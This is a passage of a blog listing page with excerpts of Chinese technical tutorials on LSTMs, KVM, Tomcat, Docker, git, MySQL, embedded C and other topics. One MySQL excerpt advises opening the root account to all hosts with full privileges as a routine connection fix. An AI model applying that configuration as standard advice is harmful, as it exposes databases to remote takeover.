		目录 6.3 LSTM的记忆能力实验6.3.1 模型构建6.3.1.1 LSTM层 6.3.2 模型训练6.3.2.1 训练指定长度的数字预测模型6.3.2.2 多组训练6.3.2.3 损失曲线展示【思考题1】LSTM与SRN实验结果对比，谈谈看法。（选做） 6.3.3 模型评价6.3.3.2 模型在不同长度的数据集上的准确率变化图【思考题2】LSTM与SRN在不同长度数据集上的准确度对比，谈谈看法。（选做） 6.3.3.3 LSTM模型门状态和单元状态的变化【思考题3】分析LSTM中单元状态和门数值的变化图，并用自己的话解释该图。 全面总结RNN（必做）总结参考 6.3 LSTM的记忆能力实验 使用LSTM模型重新进行数字求和实验，验证LSTM模型的长程依赖能力。
6.3.1 模型构建 使用第6.1.2.4节中定义Model_RNN4SeqClass模型，并构建 LSTM 算子．
只需要实例化 LSTM ，并传入Model_RNN4SeqClass模型，就可以用 LSTM 进行数字求和实验。
6.3.1.1 LSTM层 自定义LSTM算子 import torch.nn.functional as F import torch import torch.nn as nn # 声明LSTM和相关参数 class LSTM(nn.Module): def __init__(self, input_size, hidden_size, Wi_attr=None, Wf_attr=None, Wo_attr=None, Wc_attr=None, Ui_attr=None, Uf_attr=None, Uo_attr=None, Uc_attr=None, bi_attr=None, bf_attr=None, bo_attr=None, bc_attr=None): super(LSTM, self).__init__() self.input_size = input_size self.hidden_size = hidden_size # 初始化模型参数 if Wi_attr==None: Wi= torch.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b4d3cb9388e7f4a4eb9bec446be7c8b8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0c2ab5c3c17e577a0d18afaa036f47a6/" rel="bookmark">
			实验七 循环神经网络（3）LSTM的记忆能力实验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 6.3 LSTM的记忆能力实验6.3.1 模型构建6.3.1.1 LSTM层6.3.1.2 模型汇总 6.3.2 模型训练6.3.2.1 训练指定长度的数字预测模型6.3.2.2 多组训练6.3.2.3 损失曲线展示 6.3.3 模型评价6.3.3.1 在测试集上进行模型评价6.3.3.2 模型在不同长度的数据集上的准确率变化图6.3.3.3 LSTM模型门状态和单元状态的变化 思考题【思考题1】LSTM与SRN实验结果对比，谈谈看法。【思考题2】LSTM与SRN在不同长度数据集上的准确度对比，谈谈看法。【思考题3】分析LSTM中单元状态和门数值的变化图，并用自己的话解释该图。总结： 6.3 LSTM的记忆能力实验 长短期记忆网络（Long Short-Term Memory Network，LSTM）是一种可以有效缓解长程依赖问题的循环神经网络．LSTM 的特点是引入了一个新的内部状态（Internal State） c ∈ R D c \in \mathbb{R}^D c∈RD 和门控机制（Gating Mechanism）．不同时刻的内部状态以近似线性的方式进行传递，从而缓解梯度消失或梯度爆炸问题．同时门控机制进行信息筛选，可以有效地增加记忆能力．例如，输入门可以让网络忽略无关紧要的输入信息，遗忘门可以使得网络保留有用的历史信息．在上一节的数字求和任务中，如果模型能够记住前两个非零数字，同时忽略掉一些不重要的干扰信息，那么即时序列很长，模型也有效地进行预测.
LSTM 模型在第 t t t 步时，循环单元的内部结构如图6.10所示．
图6.10 LSTM网络的循环单元结构 6.3.1 模型构建 在本实验中，我们将使用第6.1.2.4节中定义Model_RNN4SeqClass模型，并构建 LSTM 算子．只需要实例化 LSTM 算，并传入Model_RNN4SeqClass模型，就可以用 LSTM 进行数字求和实验
6.3.1.1 LSTM层 LSTM层的代码与SRN层结构相似，只是在SRN层的基础上增加了内部状态、输入门、遗忘门和输出门的定义和计算。这里LSTM层的输出也依然为序列的最后一个位置的隐状态向量。代码实现如下：
import torch.nn.functional as F import torch import torch.nn as nn # 声明LSTM和相关参数 class LSTM(nn.Module): def __init__(self, input_size, hidden_size, Wi_attr=None, Wf_attr=None, Wo_attr=None, Wc_attr=None, Ui_attr=None, Uf_attr=None, Uo_attr=None, Uc_attr=None, bi_attr=None, bf_attr=None, bo_attr=None, bc_attr=None): super(LSTM, self).
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0c2ab5c3c17e577a0d18afaa036f47a6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/514ef00c9916f3917adaadcc77ff6544/" rel="bookmark">
			差分对等长绕线相关问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		差分对等长绕线问题_zding92的博客-CSDN博客_差分对等长
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a8996e990c9338d286e7896068a2381a/" rel="bookmark">
			wifi射频设计指南
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		http://t.csdn.cn/zqo96
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c4d61a079c01f22a563cef32f094a27b/" rel="bookmark">
			php获取前几天的日期
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		&lt;?php
header('content-type:text/html;charset=utf-8');
echo "前两天的日期：".date("Y-m-d", strtotime("-2 day")); //前一天 echo "&lt;br&gt;前一天的日期：".date("Y-m-d", strtotime("-1 day")); //前一天 echo "&lt;br&gt;后一天的日期：".date("Y-m-d", strtotime("+1 day")); //后一天 ?&gt;
输出：
1
2
3
前两天的日期：2021-03-23
前一天的日期：2021-03-24
后一天的日期：2021-03-26
PHP date() 函数可把时间戳格式化为可读性更好的日期和时间。
strtotime() 函数将任何英文文本的日期或时间描述解析为 Unix 时间戳（自 January 1 1970 00:00:00 GMT 起的秒数）。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b98b19057badbf429d37ef81a5194446/" rel="bookmark">
			Linux UOS统信系统安装并使用KVM
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、安装kvm虚拟机
检查虚拟化是否开启成功
grep --color -Ei 'vmx|svm' /proc/cpuinfo //vmx是Intel CPU的虚拟化技术，svm是AMD CPU的虚拟化技术 dmesg | grep kvm 带图形化管理工具的安装方式
aptitude install qemu-kvm virt-manager libguestfs-tools bridge-utils 查看kvm模块是否被正确加载
lsmod | grep kvm 2、使用方法
从其他设备拷贝虚拟机配置文件以及镜像文件
例如： cp test.xml /etc/libvirt/qemu cp test.qcow2 /var/lib/libvirt/images/ 导入虚拟机配置
virsh define test.xml 启动虚拟机
virsh start test 3、出现的报错与解决方法
(1)报错：error: Failed to define domain from test.xml
error: Cannot check QEMU binary /usr/libexec/qemu-kvm: 没有那个文件或目录
解决：UOS系统没有/usr/libexec/qemu-kvm程序，可修改为/usr/bin/qemu-system-x86_64
vim /etc/libvirt/qemu/test.xml
&lt;emulator&gt;/usr/bin/qemu-system-x86_64&lt;/emulator&gt; (2)报错：error: Failed to start domain test
error: the CPU is incompatible with host CPU: Host CPU does not provide required features: pclmuldq, pcid, aes, hle, erms, invpcid, rtm, spec-ctrl
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b98b19057badbf429d37ef81a5194446/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2149f2347d71567c131767591881fb2a/" rel="bookmark">
			git绑定远程仓库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、下载安装好git之后在cmd绑定账号和邮箱
git config --global user.name "name" git config --global user.email "email" git config --global --list //查看所绑定的信息 2、生成SSH公钥 （执行以下命令一直点回车）
ssh-keygen -t rsa 执行完命令之后在用户目录下会生成一个.ssh文件夹，SSH公钥 在id_rsa.pub文件里面
3、在git账号添加SSH公钥
添加完之后就可以提交和拉取代码了
4、idea绑定git（选择git安装的位置的git.exe）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0ea9b67596a2a758ce4f3b4b034f8a3d/" rel="bookmark">
			计算机网络第七章知识点回顾(自顶向下)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		系列文章戳这里👇
计算机网络第一章知识点总结计算机网络第二章知识点总结计算机网络第三章知识点总结计算机网络第四章知识点总结计算机网络第五章知识点总结计算机网络第六章知识点总结计算机网络第七章知识点总结计算机网络第八章知识点总结 1. 无线和移动网络 1.1 无线网络的组成 1.2一些无线链路的特性 1.3 无线网络的运行模式 1.4 无线网络的分类 1.5 蓝牙网络 1.6 无线网状网 2. 无线链路的特性 2.1 CSMA在多跳无线网络中作用受限 2.2 IEEE 802.11无线局域网 2.3 （1）802.11无线局域网架构 2.4 802.11: 信道与关联 2.5 802.11: 主动/被动扫描 2.6 （2）IEEE 802.11：MAC协议 2.7 802.11的操作模式 2.8 使用信道预约机制的CSMA/CA 2.9 信道预约: RTS-CTS交换 2.10 帧间距机制 2.11 不使用信道预约机制的CSMA/CA 2.12 CSMA/CA与CSMA/CD的不同 2.13 （3）802.11帧格式 2.13.1 802.11帧: 寻址举例 2.14 （4）802.11：终端在子网内移动 2.15 （5）802.11: 先进功能 需要掌握的知识点 3. 终端在IP子网间移动 3.1 在移动中通信：人类类比的例子 3.2 一些术语 3.3 移动节点注册 3.4 间接选路到移动节点 3.5 间接选路：三角选路问题 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0ea9b67596a2a758ce4f3b4b034f8a3d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3a479a7a061abff456c5075979ed4840/" rel="bookmark">
			Linux下安装Tomcat
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Linux下安装Tomcat 1.解压
cd /home/tools
tar -zvxf apache-tomcat-8.5.63.tar.gz -C /opt
2.catalina.sh
vim /opt/apache-tomcat-8.5.63/bin/catalina.sh
export JAVA_OPTS="-Xms10240m -Xmx16384m" Esc，输入:wq保存
3.配置环境变量
vim /etc/profile
export CATALINA_HOME=/opt/apache-tomcat-8.5.63 export CATALINA_BASE=/opt/apache-tomcat-8.5.63 Esc，输入:wq保存
4.验证
开放防火墙端口
firewall-cmd --zone=public --add-port=8080/tcp --permanent
firewall-cmd --reload
启动
cd /opt/apache-tomcat-8.5.63/bin
sh startup.sh
关闭
sh shutdown.sh
5.将Tomcat服务化
1）tomcat.service
[Unit] Description=tomcat After=syslog.target network.target remote-fs.target nss-lookup.target [Service] Type=forking Environment="JAVA_HOME=/usr/java/jdk1.8.0_271" PIDFile=/opt/apache-tomcat-8.5.63/tomcat.pid ExecStart=/opt/apache-tomcat-8.5.63/bin/startup.sh ExecReload=/bin/kill -s HUP $MAINPID ExecStop=/bin/kill -s QUIT $MAINPID PrivateTmp=true [Install] WantedBy=multi-user.target 2）setenv.sh
export JAVA_HOME=/usr/java/jdk1.8.0_271 export CATALINA_HOME=/opt/apache-tomcat-8.5.63 export CATALINA_BASE=/opt/apache-tomcat-8.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3a479a7a061abff456c5075979ed4840/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/16dadf3b3c6356054b11469e249c3f0a/" rel="bookmark">
			ros2_control、moveit2、move_group问题记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ros2_control、moveit2、move_group问题记录 问题1： [move_group-3] Error: TF_NAN_INPUT: Ignoring transform for child_frame_id "link1" from authority "Authority undetectable" because of a nan value in the transform (nan nan nan) (nan nan nan nan) 原因：
原因是没有初始化接口数据,这导致接口数据初始值为nan,因为程序一直在计算转换矩阵,目标位置为nan的情况下,无法计算
可以通过
ros2 topic echo /dynamic_joint_states 看到在values一项数值是nan
调试查看:
ros2 topic echo /tf ros2 topic echo /tf_static ros2 topic echo /dynamic_joint_states ros2 topic list ros2 control list_controllers ros2 control list_hardware_interfaces 解决方法:在硬件接口cpp文件的激活函数增加对位置的初始化
CallbackReturn TkarmSystemHardwareInterface::on_activate( const rclcpp_lifecycle::State &amp; /*previous_state*/) { // BEGIN: This part here is for exemplary purposes - Please do not copy to your production code RCLCPP_INFO(rclcpp::get_logger("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/16dadf3b3c6356054b11469e249c3f0a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/76afa5081a17441049cb8ffff137600b/" rel="bookmark">
			docker&#43;nginx 安装部署修改资源目录配置文件和容器端口信息
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		查看docker镜像 可以先查看docker下是否存在nginx镜像，使用如下这些命令查看：
docker images: 列出所有镜像。docker images nginx: 列出所有nginx镜像，不同版本等等。docker search nginx: 搜索查看所有nginx镜像信息。 拉取安装nginx镜像 使用 pull 命令拉取nginx镜像：
docker pull nginx 出现以下内容，等待下载完成即可：
运行nginx 下载完成nginx镜像后，就可以启动运行nginx了，使用如下命令：
docker run -d --name nginx -p 8080:80 nginx 部分说明如下：
-d 后台持续运行运行。--name 自定义的容器名称。-p 映射主机端口号到docker容器的端口号。
这里端口8008即为外部web访问的端口号，而80则为nginx容器对外暴露的端口号。 启动成功，就可以通过 ip:8008 访问站点。
以上即是 docker 安装启动 nginx 容器服务成功。
非常简单的处理，接下来我们要做的事情，是如何处理nginx的配置、日志、静态资源等等内容，这些就相对复杂了。有多种方式可以处理配置资源文件等，下面将详细介绍。
映射到本地目录 查看nginx容器的配置资源目录
进入容器，可以执行命令 docker exec -it container-id/container-name bash docker exec -it container-id/container-name /bin/bash // -i: 以交互模式运行 // -t: 为容器重新分配一个伪输入终端 // -i 与 -t 通常同时使用 // container-id 容器id // container-name 自定义容器名称 // bash (/bin/bash) linux 命令，启动一个bash终端，可与用户交互 进入容器bash终端后，可以查看到nginx相关内容的目录位置如下： log 日志文件目录：/var/log/nginx
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/76afa5081a17441049cb8ffff137600b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d0b9fe5e634713426abc6f6972c17fcc/" rel="bookmark">
			宝塔下载mysql 8.0 navicat连接不上
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 原因大致有以下几个： 原因一：先查看宝塔中的3306端口是否开放。
原因二：阿里云安全组中的3306端口未开放。
原因三：没有赋权限！
命令行登录mysql
mysql -u root -p use mysql; select user,host from user； update user set host = '%' where user ='root'; 完之后，给当前用户所有权限，赋权限，如下命令：
​​​​​​​grant all privileges on *.* to root@'%' with grant option; 命令解释：
GRANT：赋权命令
ALL PRIVILEGES：当前用户的所有权限
ON：介词
*.*：当前用户对所有数据库和表的相应操作权限
TO：介词
'root'@'%'：权限赋给root用户，所有ip都能连接
WITH GRANT OPTION：允许级联赋权
完之后，刷新下，命令如下：
flush privileges; 如图：
此时，连接成功：
2022年12月01日修改：
​​​​​​​之前写的：给当前用户所有权限，赋权限命令在mysql高版本报语法错误，经查找，需要修改为以下命令：
grant all privileges on *.* to 'root'@'%'; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/25405edee978f0405b0afac8bd1d13e5/" rel="bookmark">
			pycharm快捷键设置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 设置运行当前程序：
File——Settings——Keymap——Other——Run context configuration.
2. 设置调试当前程序：
File——Settings——Keymap——Other——Debug context configuration.
3. 主题设置
File——Settings——Appearance &amp; Behavior——Appearance.
4. 插件下载
File——Settings——Pluguins——Marketplace.
5. 程序选中高亮设置
File——Settings——Editor——Color Scheme——General——Code——Identifier under caret/Identifier under caret (write)——Background
文本光标下的标识符（写入）.
6. 程序滚动条高亮
File——Settings——Editor——Color Scheme——General——Code——Identifier under caret/Identifier under caret (write)——Error stripe mark.
7. print快速使用
在一个字符串或其他对象后边直接输入.print，可快速打印该字符串。
8. 跨行选取相同单词
Alt + J选择相同单词，可以同时编辑多行，Alt + Shift + J取消选择。
9. iter快速遍历列表
iter可实现快速补全遍历数组的代码。
10. 快速将一列文字格式化为数组
按住Alt + Shift键并拖动鼠标左键，选择列，然后输入引号，使用HOME、END键跳转到开头和结尾，实现快速将字符串格式化为列表。
11. 在pycharm中书写程序的时候，有时候不注意格式，会造成程序中有很多的警告，这时候，pycharm已经为我们开发了一个快速规整程序格式的入口，快捷键为Ctrl + Alt + L。
12. 选中代码显示
改变选中代码的背景颜色，File——Settings——Editor——Color Scheme——General——Editor——Guides——Selection background.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/25405edee978f0405b0afac8bd1d13e5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8a5065c184c8e221da166ef1df994996/" rel="bookmark">
			基于51单片机霍尔传感器测速（仿真&#43;源程序）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		资料编号：196 下面是该资料仿真演示视频：
196-基于51单片机霍尔传感器测速（仿真+源程序+全套资料）
功能简介：
51单片机计数测速转速测量，在仿真中等价于测量外部脉冲频率；如果修改输入脉冲的频率，在数码管上可实时显示当前频率！
功能：霍尔传感器测速，霍尔传感器的信号输出脚接T1(P3.5)引脚
测量范围：假设转盘只有一个磁钢，转速低于10r/S则显示0，高于655360r/s则计数溢出（一般应用不会超出此限）
下面是部分程序展示：
/*********************************
函数名称：void delay1ms(unsigned int k)
功能:延时子函数
入口参数：延时时长
返回值：无
**********************************/
void delay1ms(unsigned int k)
{ unsigned char n,m;
for(m=0;m&lt;k;m++)
{for(n=0;n&lt;115;n++);}
}
//===================主函数
void main()
{
unsigned char n;
//EA=0;
TMOD=0x51;//0101 0001,T1纯软件启动，计数模式，工作方式1；T0纯软件启动，定时模式，工作方式1
TH0=0x3c;//12M晶振，定时50ms
TL0=0xb0;
ET0=1;//开启定时0中断
EA=1;//开启总中断
TR0=1;//同时启动定时与计数
TR1=1;
while(1)
{ speed=count/N;//结果为:x转/s,注意防止其越界 for(n=20;n&gt;0;n--)//稳定显示一阵
{
disp(speed/1000,speed%1000/100,speed%100/10,speed%10);
}
TR0=1;//再次启动定时和计数功能，为下一次的测量作准备
TR1=1;
}
}
下面是该资料的分享下载链接：
https://docs.qq.com/doc/DTW1GS3ZUd3FWRFJh
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2e86a105c7be3ddd1b179e0333ccbdc8/" rel="bookmark">
			Clion代码提示功能消失无法标出错误代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Clion就不用多说了吧，jetbrains永远的神！
初次遇到这个问题也不知道是怎么回事，突然代码写着写着感到十分顺利。要是按照往常，依据jetbrains的强迫症，非要对你写的代码催毛求疵找出有误的地方，或者警告，或是拼写错误。但是我敲了很久都没发现出现啥问题，然后心想没想到这次作业完成的那么顺了，甚至不许要debug。就当我运行后发现，控制台一堆报错。查看控制台报错信息，发现是有写地方变量名写错了，但是我非常疑惑，这也不是什么逻辑错误，这么低级的错误应该会代码高亮显式才对。然而并没有。后面我测试发现clion无法检测出错误代码。
目录
方法一：
方法二：
方法三： 方法四：
这是错误代码测试
正常情况应该是像这样被标记出来
再经过一番查找后解决了该问题，话不多说，请根据下面的方法一个一个尝试来看是否能解决你的问题。
方法一： 无法标记出错误可能是你的设置问题，比如未选择检查所有问题或者是打开了省电模式。
clion检查代码需要你正确的设置
未选择“检查所有问题”clion只会检查你代码的警告问题或者是拼写错误。
开了省电模式clion就会关掉解析代码功能，也就不会帮你检查出代码的错误。
解决方法如下：
选择“所有问题”
关闭省电模式
找不到省电模式的同学可以直接用clion的搜索功能查找“省电模式”
然后将其关闭
方法二： 清除清除文件系统缓存和本地历史记录
不过这个操作清除你在 IDE 上的操作的记录如代码历史记录。但是它并不会删除你文件中的任何代码。
具体操作如下文件 | 清除缓存 | 勾选清除文件系统缓存和本地历史记录| 清除缓存并重新启动 方法三： 把 Show errors and warning from clangd 和 Use clang-tidy via clang 选项关闭。 Show errors and warning from clangd 和 Use clang-tidy via clang 是用于检查你代码错误的设置，如果你正在实用clang 来解析代码那么有可能是clang 无法工作导致检测不出错误代码。将其关闭即可。
文件--》设置
语言和框架（ Languages &amp; Frameworks ）
这样实用编译器自身的代码检测功能就可以避免clang不工作的问题。
方法四： 卸载重装，因为代码无法检测可能是编译器出现了其他未知的问题，不是专业认识也没法针对性查找。重装前请确认，新建一个文件，检查在该文件下代码检测功能是否工作。因为有可能是你文件编译的原因，就这个文件无法实现代码检测功能，而不是cliom无法进行代码检测。如果新建文件仍无法进行代码检测，那么可以重装了，重装记得先将clion中重要（代码）文件备份。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0ca5d34886ba6811827fd5bd3875c7cc/" rel="bookmark">
			网络编程简单学习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、 概述
1. 什么是计算机网络？
2. 网络编程的目的
3. 需要达到什么样的效果？
二、 网络通信的两个要素
1. 通信双方地址
2. 规则：网络通信协议
三、IP地址
1. IP地址概述
2. IP地址分类
3. 域名
四、端口
五、通信协议
六、TCP实现聊天 七、TCP文件上传实现
八、Tomcat
关于C/S与B/S的区别？ 九、UDP
1. UDP消息发送
2. UDP聊天实现
3. UDP实现多线程在线咨询
十、URL下载网络资源
一、 概述 1. 什么是计算机网络？ 计算机网络是指将地理位置不同的具有独立功能的多台计算机及其外部设备，通过通信线路连接起来，在网络操作系统，网络管理软件及网络通信协议的管理和协调下，实现资源共享和信息传递的计算机系统。
2. 网络编程的目的 进行信息交换、数据交换、通信
3. 需要达到什么样的效果？ 如何准确的定位网络上的一台（多台）主机找到了主机之后怎么进行数据传输？ 二、 网络通信的两个要素 1. 通信双方地址 ①IP
②端口号
2. 规则：网络通信协议 常见的协议：http、tcp、udp、ftp。。。
三、IP地址 1. IP地址概述 唯一定位一台网络上计算机
127.0.0.1：本地localhost
2. IP地址分类 ipv4 / ipv6 ipv4：127.0.0.1 四个字节，0-255，总共约42亿个
ipv6： fe80::7c35:c70b:19ee:ba00%21 128位，8个无符号整数
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0ca5d34886ba6811827fd5bd3875c7cc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1952a316d82d504d1dfbea9906053307/" rel="bookmark">
			[数据结构] 二叉树--堆
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		堆 什么是堆堆的实现类的定义构造函数析构函数push向上调整判断堆是否为空返回堆中有效数据个数返回堆顶的数据pop数据,删除堆顶的数据向下调整 堆的应用TopK问题堆排序1.第一种建堆方式--&gt;向上调整2.第二种建堆方式---&gt;向下调整排序 总结 什么是堆 注意大家在学习编程的过程中, 肯定听说过内存中的堆和栈以及静态区这种的, 这些是属于操作系统虚拟进程地址空间中的,
我们要说的堆和这个并不是一回事,堆是二叉树的一种, 是数据结构的一种,我们来看看吧
普通的二叉树不使用数组来存储,只有堆用数组来存储,
所以说堆的逻辑结构是二叉树, 物理结构是数组
如果有一个关键码的集合K = { ， ， ，…， }，把它的所有元素按完全二叉树的顺序存储方式存储,在一个一维数组中，并满足： &lt;= 且 &lt;= ( &gt;= 且 &gt;= ) i = 0，1，2…，则称为小堆(或大堆)。将根节点最大的堆叫做最大堆或大根堆，根节点最小的堆叫做最小堆或小根堆
堆的性质:
堆中某个节点的值总是不大于或不小于其父节点的值；堆总是一棵完全二叉树。 小堆: 子节点都比不小于父节点
大堆
那我们尝试用数组来实现这种数据结构
堆的实现 那我们来分析一下堆这个类中需要哪些成员, 类的定义 template &lt;class T&gt; class Heap { public: Heap(); void push(T val); void pop(); T Top(); bool empty(); size_t size(); ~Heap(); private: T* _data; int _top;//指向最后一个数据的下一个位置 int _capacity; }; 构造函数 默认构造就是把成员都初始化一下,我这里没有开默认空间, 大家可以选择开
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1952a316d82d504d1dfbea9906053307/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/16917927eac8fcfc38dc163830e7063a/" rel="bookmark">
			图像分类竞赛TOP方案分享
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		来源：投稿 作者：LSC
编辑：学姐
比赛名次 最终分数0.98079分，排名第一
赛题任务: 基于Caltech数据集的图像分类，Caltech101包含102个类，每种类别大约40到800个图像，训练集总计7999图像。本次试题需要图片为输入，通过课程学习的分类方法（支持向量机、深度神经网络、卷积神经网络等）从中识别该图像属于哪一个类别。
数据说明 images下存储所有的训练+测试图像，trian.txt中存储用于训练图像路径和对应标注，图片路径+\t+标签，test.txt中存储测试图像。
限制
只能用paddle框架和在astudio上运行代码
提交答案 考试提交，需要提交模型代码项目版本和结果文件。结果文件为TXT文件格式，命名为result.txt，文件内的字段需要按照指定格式写入。
结果文件要求：
每一行为：图像名\t标签 101_0073.jpg\t13
输出结果应检查是否为1145行数据，否则成绩无效。
输出结果文件命名为result.txt，一行一个数据
基本思路 为了方便使用各种技巧，我使用了paddlex框架，这是由paddle写出的封装性强、使用便捷的框架，并且对数据集划分训练集和验证集，使用有知识蒸馏的技巧的resnet101模型。
训练前我对训练集使用了数据增强，包括随机翻转、mixup、正则化等，训练时采用了标签平滑、学习率衰减等策略，模型准确率达到97%，我再将全部的数据都放进模型训练，对测试集进行测试，提交后准确率达到98%。
!unzip /home/aistudio/data/data146107/dataset.zip -d /home/aistudio/data # 导入需要的包 import paddle import os import numpy as np from PIL import Image import matplotlib.pyplot as plt import sys import pickle from paddle.vision.transforms import ToTensor import paddle.nn.functional as F print("本教程基于Paddle的版本号为："+paddle.__version__) from sklearn.utils import shuffle # 划分数据集，生成验证集 total_list = [] f = open('/home/aistudio/data/dataset/train.txt', 'r', encoding='utf-8') # total_len = len(f.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/16917927eac8fcfc38dc163830e7063a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/94a1452336316a8f8f0129a54451b51f/" rel="bookmark">
			Python实现Collaborative Representation Detector(CRD)高光谱异常检测算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		import scipy.io as scio from scipy.linalg import pinv import numpy as np import matplotlib.pyplot as plt import time def CRD(mat, win_in, win_out, regularization): rows, cols, bands = mat.shape # XX为图像的长度 YY为图像的高度 band为图像的波段数 result = np.zeros((rows, cols)) w1 = int(np.fix(win_out / 2)) w2 = int(np.fix(win_in / 2)) M = win_out ** 2 num_sam = win_out * win_out - win_in * win_in # padding avoid edges DataTest = np.zeros((3 * rows, 3 * cols, bands)) DataTest[rows: 2 * rows, cols: 2 * cols, :] = mat DataTest[rows: 2 * rows, 0: cols, :] = mat[:, cols:: -1, :] DataTest[rows: 2 * rows, 2 * cols: 3 * cols, :] = mat[:, cols:: -1, :] DataTest[0: rows, :, :] = DataTest[2 * rows:rows:-1, :, :] DataTest[2 * rows: 3 * rows, :, :] = DataTest[2 * rows:rows:-1, :, :] Gamma = np.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/94a1452336316a8f8f0129a54451b51f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5a32bb098ae63a237959a0dfbafad63e/" rel="bookmark">
			HTML5&#43;plus 移动文件夹或文件(必会！！)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 直接上我写的教程
// 移动文件夹和文件都是一样得 // _doc/photo_002.jpg 这个是你要移动的文件或文件夹 // 这里很坑 我以为是先获取你要把文件移动到的那个目录结果不是 是先获取你要移动的文件目录对象 plus.io.resolveLocalFileSystemURL('_doc/photo_002.jpg',entry =&gt; { // 获取你要移动到的目录对象 plus.io.resolveLocalFileSystemURL('_doc/测试',res=&gt;{ // 这里的res就是要移动到的文件目录对象，一开始我以为是目录整了老久 // moveTo 参数:第一个你要移动到那个目录下面就获取对应的目录对象，第二个是重命名文件夹或文件的名字 //注意如果是移动文件的话 第二个参数最好是不要乱改会破坏文件的 entry.moveTo(res,'',res1=&gt;{ console.log(res1,'成功'); },err=&gt;{ console.log(err,'是顾拜');	}) }) },err=&gt;{ console.log(err,'打开失败'); }) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/02f0a5ca70245eb2396d202250d729a4/" rel="bookmark">
			HTML5&#43;plus创建文件夹(必会！)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 最近我也是在做app 用到了HTML5+plus里面的一些api，发现官方文档解释的并不是很清楚，一些问题百度也搜不到，我就写一个教学吧，必会！！
